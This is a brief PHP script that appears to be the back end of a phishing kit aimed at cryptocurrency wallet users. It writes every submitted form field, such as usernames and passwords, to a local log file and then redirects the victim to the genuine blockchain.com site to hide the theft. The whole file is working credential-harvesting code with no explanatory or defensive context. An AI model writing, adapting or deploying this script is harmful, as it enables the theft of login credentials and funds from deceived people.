<?php
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
header("Location:https://blockchain.com"); /* Redirect browser */

/* Make sure that code below does not get executed when we redirect. */
exit;
?>